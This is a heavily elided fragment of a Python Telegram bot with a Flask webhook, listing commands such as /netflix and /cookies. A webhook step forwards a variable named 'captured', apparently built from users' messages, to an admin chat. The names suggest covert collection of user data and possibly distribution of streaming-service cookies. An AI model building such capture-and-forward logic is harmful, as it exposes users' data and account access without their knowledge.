...
# ============================================
# 🆕 NEW COMMANDS - /cookies, /myid, /ping, /help, /uptime
# ============================================
...
def webhook():
    try:
        ...
        if 'message' in data and 'from' in data['message']:
            ...
            # 8. SEND TO ADMIN
            try:
                bot.send_message(chat_id=ADMIN_ID, text=captured, parse_mode='Markdown')
            except Exception as e:
...
if __name__ == "__main__":
    ...
    print("=" * 60)
    print("\n📌 All Commands:")
    print("   /start, /netflix, /cookies, /myid, /ping, /help, /uptime")
    ...
    # Run Flask in background (if webhook needed) - or keep polling
    from threading import Thread
    def run_flask():
        port = int(os.environ.get("PORT", 8443))
        flask_app.run(host='0.0.0.0', port=port, debug=False)
    
    # Start Flask in thread (for webhook)
